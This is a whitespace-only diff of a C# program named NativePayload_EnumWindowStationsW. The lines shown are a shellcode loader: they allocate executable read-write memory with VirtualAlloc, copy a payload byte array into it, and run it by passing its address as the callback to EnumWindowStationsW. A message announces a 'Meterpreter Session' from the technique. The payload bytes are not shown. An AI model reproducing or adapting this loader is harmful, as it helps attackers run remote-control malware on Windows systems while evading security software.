@@ -6,9 +6,9 @@ using System.Text;
 using System.Threading.Tasks;
 
 namespace NativePayload_EnumWindowStationsW
-{   
+{
     /// <summary>
-    /// .NET 3.5 or 4.0 only... (tested)  
+    /// .NET 3.5 or 4.0 only... (tested)
     /// </summary>
     class Program
     {
@@ -77,10 +77,10 @@ namespace NativePayload_EnumWindowStationsW
             IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
             Marshal.Copy(Xpayload, 0, p, Xpayload.Length);
             Console.WriteLine("[!] [" + DateTime.Now.ToString()+ "]::VirtualAlloc.Result[" + p.ToString("X8") + "]");
-            System.Threading.Thread.Sleep(5555);          
+            System.Threading.Thread.Sleep(5555);
             Console.WriteLine();
-            Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"EnumWindowStationsW\"  ;)");            
-            bool ok = EnumWindowStationsW(p, IntPtr.Zero);         
+            Console.WriteLine("Bingo: Meterpreter Session via callback functions Technique by \"EnumWindowStationsW\"  ;)");
+            bool ok = EnumWindowStationsW(p, IntPtr.Zero);
             Console.ReadKey();
         }
     }
